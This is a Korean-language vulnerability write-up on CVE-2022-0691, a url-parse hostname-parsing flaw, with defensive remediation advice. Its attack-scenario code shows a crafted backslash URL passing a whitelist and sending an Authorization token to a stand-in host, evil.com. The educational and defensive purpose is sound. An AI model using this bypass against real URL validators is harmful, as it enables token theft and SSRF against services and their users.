# CVE-2022-0691 - url-parse Authorization Bypass

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2022-0691 |
| CVSS | 9.8 (Critical) |
| 영향 패키지 | url-parse |
| 영향 버전 | < 1.5.8 |
| 수정 버전 | 1.5.8 |
| 공격 유형 | Authorization Bypass / SSRF |
| 발견일 | 2022-02-21 |

## 왜 프론트엔드 개발자가 알아야 하는가

`url-parse`는 주간 수백만 다운로드를 기록하는 URL 파싱 라이브러리다. 프론트엔드에서 다음 용도로 사용된다:

- OAuth 콜백 URL 검증
- 리다이렉트 URL 화이트리스트 검사
- API 요청 대상 호스트 검증
- CORS origin 파싱

파싱 결함을 악용하면 검증 로직을 우회하여 인증 토큰을 탈취하거나 SSRF를 유발할 수 있다.

## 취약점 기술 분석

`url-parse`는 URL의 authority 부분(특히 `@` 기호)을 처리할 때, 백슬래시(`\`)를 정규화하지 않는 결함이 있었다. 이로 인해 파싱된 호스트명과 실제 요청 대상 호스트가 달라진다.

```javascript
const Url = require('url-parse');

// 정상적인 URL 파싱
const parsed = new Url('https://example.com/path');
// parsed.hostname === 'example.com' ✓

// 공격 URL — 백슬래시로 authority 경계를 혼동
const malicious = new Url('https://example.com\\@evil.com/path');
// url-parse: hostname === 'example.com' (잘못된 결과!)
// 브라우저/HTTP 클라이언트 실제 동작: hostname === 'evil.com'
```

핵심은 **url-parse가 파싱하는 호스트**와 **실제 요청되는 호스트**가 다르다는 것이다.

## 공격 시나리오

```javascript
const Url = require('url-parse'); // < 1.5.8

// 서버의 URL 검증 로직
function isAllowedUrl(url) {
  const parsed = new Url(url);
  const allowedHosts = ['api.myapp.com', 'cdn.myapp.com'];
  return allowedHosts.includes(parsed.hostname);
}

// 공격자의 조작된 URL
const attackUrl = 'https://api.myapp.com\\@evil.com/steal-token';

// 검증 통과! (url-parse는 hostname을 'api.myapp.com'으로 파싱)
console.log(isAllowedUrl(attackUrl)); // true

// 실제 HTTP 요청은 evil.com으로 전송됨
// → Authorization 헤더가 공격자 서버로 전달
fetch(attackUrl, {
  headers: { Authorization: 'Bearer ' + token }
});
```

## 방어 방법

### 즉시 조치
```bash
npm install url-parse@1.5.8
# 또는 내장 URL API로 전환
```

### 코드 레벨 방어
```javascript
// ✅ 브라우저/Node.js 내장 URL API 사용 (WHATWG 표준 준수)
function isAllowedUrl(url) {
  try {
    const parsed = new URL(url); // 내장 URL API
    const allowedHosts = ['api.myapp.com', 'cdn.myapp.com'];
    return allowedHosts.includes(parsed.hostname);
  } catch (e) {
    return false; // 잘못된 URL은 거부
  }
}
```

### 장기 전략
- URL 파싱에는 WHATWG URL 표준 준수 구현체만 사용
- 서드파티 URL 파서 대신 플랫폼 내장 `URL` 클래스를 우선 사용
- URL 검증 시 파싱 → 정규화 → 비교 패턴 적용

## 교훈 & 프론트엔드 적용 포인트

1. **파서 차이(Parser Differential)는 보안 취약점이다**: 검증 로직과 실행 로직이 같은 파서를 사용해야 한다.
2. **내장 API 우선 원칙**: `URL`, `URLSearchParams` 등 표준 API가 있으면 서드파티가 불필요하다.
3. **OAuth/리다이렉트 URL 검증은 보안 크리티컬하다**: 토큰 탈취의 직접적 공격 경로가 된다.
4. **SSRF는 프론트엔드 BFF의 현실적 위협이다**: URL 기반 요청을 하는 모든 서버 코드에서 검증이 필요하다.

## 참고 자료

- [NVD - CVE-2022-0691](https://nvd.nist.gov/vuln/detail/CVE-2022-0691)
- [GitHub Advisory - GHSA-jf5r-8hm2-f872](https://github.com/advisories/GHSA-jf5r-8hm2-f872)
- [url-parse npm](https://www.npmjs.com/package/url-parse)
- [WHATWG URL Standard](https://url.spec.whatwg.org/)
